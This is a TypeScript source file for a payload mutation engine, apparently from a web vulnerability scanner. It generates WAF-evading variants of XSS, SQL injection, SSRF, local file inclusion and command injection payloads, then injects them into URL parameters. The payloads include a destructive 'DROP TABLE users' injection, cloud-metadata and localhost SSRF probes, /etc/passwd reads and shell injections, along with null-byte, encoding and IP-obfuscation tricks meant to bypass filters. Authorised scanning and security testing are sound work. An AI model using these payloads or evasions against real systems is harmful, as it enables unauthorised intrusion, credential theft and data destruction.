/**
 * WAF-aware payload mutation engine.
 * Takes a base payload and generates encoding/obfuscation variants
 * to improve detection rates against WAFs and filters.
 */

export interface MutatedPayload {
  original: string;
  variant: string;
  technique: string;
}

class PayloadMutator {
  // XSS mutations
  private xssBase = [
    `<script>alert(1)</script>`,
    `<img src=x onerror=alert(1)>`,
    `"><svg onload=alert(1)>`,
    `javascript:alert(1)`,
    `'><script>alert(1)</script>`,
  ];

  // SQLi mutations
  private sqliBase = [
    `' OR '1'='1`,
    `' OR 1=1--`,
    `1; DROP TABLE users--`,
    `' UNION SELECT NULL--`,
    `admin'--`,
  ];

  // SSRF mutations
  private ssrfBase = [
    `http://169.254.169.254/latest/meta-data/`,
    `http://127.0.0.1/admin`,
    `http://[::1]/admin`,
    `http://localhost:6379/`,
  ];

  // LFI mutations
  private lfiBase = [
    `../../../../etc/passwd`,
    `..%2F..%2F..%2F..%2Fetc%2Fpasswd`,
    `/etc/passwd`,
  ];

  // Command injection
  private rceBase = [
    `; id`,
    `| id`,
    `&& id`,
    `$(id)`,
    "`id`",
  ];

  mutate(vulnClass: string, beaconUrl?: string): MutatedPayload[] {
    const base = this.getBase(vulnClass, beaconUrl);
    const mutations: MutatedPayload[] = [];

    for (const payload of base) {
      mutations.push(...this.applyMutations(payload, vulnClass));
    }

    // Deduplicate and cap
    const seen = new Set<string>();
    return mutations.filter(m => {
      if (seen.has(m.variant)) return false;
      seen.add(m.variant);
      return true;
    }).slice(0, 20);
  }

  /** Exposed (was private) so callers that need a representative seed payload
   *  for this vulnClass — without wanting this class's own generic mutation
   *  set — can reuse the same base list instead of duplicating one. */
  getBase(vulnClass: string, beaconUrl?: string): string[] {
    switch (vulnClass) {
      case "xss": return beaconUrl
        ? [...this.xssBase, `<img src="${beaconUrl}">`, `<script src="${beaconUrl}"></script>`]
        : this.xssBase;
      case "sqli":      return this.sqliBase;
      case "blind_sqli": return this.sqliBase;
      case "ssrf":      return beaconUrl
        ? [...this.ssrfBase, beaconUrl]
        : this.ssrfBase;
      case "lfi":       return this.lfiBase;
      case "rce":       return this.rceBase;
      default:          return [];
    }
  }

  private applyMutations(payload: string, vulnClass: string): MutatedPayload[] {
    const variants: MutatedPayload[] = [{ original: payload, variant: payload, technique: "baseline" }];

    // URL encoding
    variants.push({
      original: payload,
      variant: encodeURIComponent(payload),
      technique: "url-encode",
    });

    // Double URL encoding
    variants.push({
      original: payload,
      variant: encodeURIComponent(encodeURIComponent(payload)),
      technique: "double-url-encode",
    });

    if (vulnClass === "xss") {
      // Case variation
      variants.push({
        original: payload,
        variant: this.randomCase(payload),
        technique: "case-variation",
      });

      // HTML entity encoding for < and >
      variants.push({
        original: payload,
        variant: payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"),
        technique: "html-entity",
      });

      // Null byte injection
      variants.push({
        original: payload,
        variant: payload.replace("<", "\x00<"),
        technique: "null-byte",
      });

      // Comment insertion (break up signatures)
      variants.push({
        original: payload,
        variant: payload.replace("script", "sc/**/ript"),
        technique: "comment-break",
      });

      // SVG-based bypass
      variants.push({
        original: payload,
        variant: `<svg/onload=eval(atob('${btoa("alert(1)")}'))>`,
        technique: "svg-base64",
      });

      // Unicode escape
      variants.push({
        original: payload,
        variant: this.unicodeEscape(payload),
        technique: "unicode-escape",
      });
    }

    if (vulnClass === "sqli" || vulnClass === "blind_sqli") {
      // Comment variation
      variants.push({
        original: payload,
        variant: payload.replace("--", "#"),
        technique: "comment-hash",
      });

      // Whitespace substitution
      variants.push({
        original: payload,
        variant: payload.replace(/ /g, "/**/"),
        technique: "whitespace-comment",
      });

      // Case variation
      variants.push({
        original: payload,
        variant: payload.replace(/\bOR\b/g, "oR").replace(/\bAND\b/g, "aNd").replace(/\bUNION\b/g, "UnIoN"),
        technique: "keyword-case",
      });

      // Hex encoding of string literals
      variants.push({
        original: payload,
        variant: payload.replace(/'1'/, "0x31"),
        technique: "hex-literal",
      });
    }

    if (vulnClass === "lfi") {
      // Null byte bypass (for older PHP)
      variants.push({
        original: payload,
        variant: `${payload}%00.jpg`,
        technique: "null-byte-ext",
      });

      // Double encode slashes
      variants.push({
        original: payload,
        variant: payload.replace(/\//g, "%252F"),
        technique: "double-encode-slash",
      });

      // Absolute path variation
      variants.push({
        original: payload,
        variant: `/.${payload}`,
        technique: "dot-prefix",
      });
    }

    if (vulnClass === "rce") {
      // Whitespace bypass
      variants.push({
        original: payload,
        variant: payload.replace(/ /g, "${IFS}"),
        technique: "ifs-whitespace",
      });

      // Brace expansion
      variants.push({
        original: payload,
        variant: payload.replace("id", "{i,d}"),
        technique: "brace-expand",
      });
    }

    if (vulnClass === "ssrf") {
      // Protocol variations
      variants.push({
        original: payload,
        variant: payload.replace("http://", "dict://"),
        technique: "protocol-dict",
      });
      variants.push({
        original: payload,
        variant: payload.replace("http://127.0.0.1", "http://0.0.0.0"),
        technique: "null-ip",
      });
      variants.push({
        original: payload,
        variant: payload.replace("http://127.0.0.1", "http://0177.0.0.1"),
        technique: "octal-ip",
      });
      variants.push({
        original: payload,
        variant: payload.replace("http://127.0.0.1", "http://2130706433"),
        technique: "decimal-ip",
      });
    }

    return variants;
  }

  private randomCase(s: string): string {
    return s.split("").map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join("");
  }

  private unicodeEscape(s: string): string {
    return s.split("").map(c => {
      const code = c.charCodeAt(0);
      return code > 127 || c === "<" || c === ">" ? `\\u${code.toString(16).padStart(4, "0")}` : c;
    }).join("");
  }

  // Generate a parameterized URL with a mutated payload
  injectPayload(baseUrl: string, paramName: string, payload: string): string {
    try {
      const u = new URL(baseUrl);
      u.searchParams.set(paramName, payload);
      return u.toString();
    } catch {
      return `${baseUrl}?${paramName}=${encodeURIComponent(payload)}`;
    }
  }

  // Auto-detect injectable parameters from URL
  findInjectableParams(url: string): string[] {
    try {
      const u = new URL(url);
      const params: string[] = [];
      u.searchParams.forEach((_, key) => params.push(key));
      return params.length > 0 ? params : ["q", "id", "page", "search", "query"];
    } catch {
      return ["q", "id", "search"];
    }
  }
}

export const payloadMutator = new PayloadMutator();
